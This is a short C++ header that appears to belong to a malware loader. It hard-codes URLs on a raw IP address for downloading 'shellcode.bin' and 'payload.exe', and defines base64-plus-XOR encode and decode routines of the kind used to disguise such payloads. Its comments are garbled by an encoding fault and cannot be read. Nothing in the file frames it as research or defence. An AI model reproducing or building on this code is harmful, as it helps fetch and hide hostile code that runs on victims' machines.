#pragma once
#include "xcrypt.hpp"

#define SHELLCODE_URL L"118.107.57.77:8000/shellcode.bin.txt"
#define PAYLOAD_URL L"118.107.57.77:8000/payload.exe.txt"

namespace xvary
{
	//
	// �޸ļӽ���ֻ��Ҫ�޸�����������
	//

	// ����
	std::string decode(std::string s)
	{
		// �Ƚ���base64 �ٽ���xor
		std::string ret;

		do
		{
			// base64
			std::string base = xcrypt::decode_base(s);
			if (base.empty())
			{
				break;
			}

			// xor
			base = xcrypt::decode_xor(base);
			if (base.empty())
			{
				break;
			}

			ret = base;
		} while (false);

		return ret;
	}

	// ����
	std::string encode(std::string s)
	{
		// �ȼ���xor �ټ���base64
		std::string ret;

		do
		{
			// xor
			std::string x = xcrypt::encode_xor(s);
			if (x.empty())
			{
				break;
			}

			// base
			x = xcrypt::encode_base(x);
			if (x.empty())
			{
				break;
			}

			ret = x;
		} while (false);

		return ret;
	}

} // namespace xvary